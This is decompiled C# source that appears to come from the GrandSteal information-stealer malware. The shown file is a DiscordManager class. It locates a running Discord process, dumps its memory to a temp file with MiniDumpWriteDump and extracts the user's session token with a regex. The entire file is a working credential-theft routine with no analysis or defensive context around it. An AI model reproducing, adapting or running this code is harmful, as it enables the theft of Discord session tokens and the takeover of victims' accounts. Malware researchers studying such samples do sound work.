using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using GrandSteal.Client.Models;
using GrandSteal.Client.Models.Extensions.Json;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x02000019 RID: 25
	public static class DiscordManager
	{
		// Token: 0x0600008D RID: 141
		[DllImport("DbgHelp.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, IntPtr hFile, uint DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);

		// Token: 0x0600008E RID: 142 RVA: 0x00005F94 File Offset: 0x00004194
		public static DiscordSession Extract()
		{
			try
			{
				Process process = DiscordManager.FindDisordProcess();
				if (process != null)
				{
					string text = DiscordManager.DumpProcess(process);
					if (!string.IsNullOrEmpty(text))
					{
						string text2 = DiscordManager.FindDiscordJsonSession(text);
						if (!string.IsNullOrEmpty(text2))
						{
							return text2.FromJSON<DiscordSession>();
						}
						Console.WriteLine("JsonSession UNKNOWN");
					}
					else
					{
						Console.WriteLine("Discord dump UNKNOWN");
					}
				}
				else
				{
					Console.WriteLine("Discord process UNKNOWN");
				}
			}
			catch (Exception arg_54_0)
			{
				Console.WriteLine(arg_54_0);
			}
			return null;
		}

		// Token: 0x0600008F RID: 143 RVA: 0x00006010 File Offset: 0x00004210
		private static string FindDiscordJsonSession(string data)
		{
			try
			{
				using (IEnumerator enumerator = DiscordManager.regex.Matches(data).GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						return ((Match)enumerator.Current).Value;
					}
				}
			}
			catch (Exception arg_41_0)
			{
				Console.WriteLine(arg_41_0);
			}
			return string.Empty;
		}

		// Token: 0x06000090 RID: 144 RVA: 0x00006088 File Offset: 0x00004288
		private static string DumpProcess(Process process)
		{
			string empty = string.Empty;
			try
			{
				string path = Environment.ExpandEnvironmentVariables(Path.Combine("%temp%", "discord.dmp"));
				bool flag = false;
				using (FileStream fileStream = File.Open(path, FileMode.Create, FileAccess.Write))
				{
					flag = DiscordManager.MiniDumpWriteDump(process.Handle, process.Id, fileStream.SafeFileHandle.DangerousGetHandle(), 2u, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
				}
				if (flag)
				{
					return File.ReadAllText(path);
				}
			}
			catch
			{
			}
			return empty;
		}

		// Token: 0x06000091 RID: 145 RVA: 0x00006128 File Offset: 0x00004328
		private static Process FindDisordProcess()
		{
			try
			{
				Process[] processesByName = Process.GetProcessesByName("Discord");
				for (int i = 0; i < processesByName.Length; i++)
				{
					Process process = processesByName[i];
					if (ClientInfoHelper.GetCommandLine(process).Trim() == "\"" + process.MainModule.FileName + "\"")
					{
						return process;
					}
				}
			}
			catch (Exception arg_4F_0)
			{
				Console.WriteLine(arg_4F_0);
			}
			return null;
		}

		// Token: 0x04000058 RID: 88
		private static Regex regex = new Regex("({\"token\":\"(.*)}}]})", RegexOptions.Compiled);
	}
}
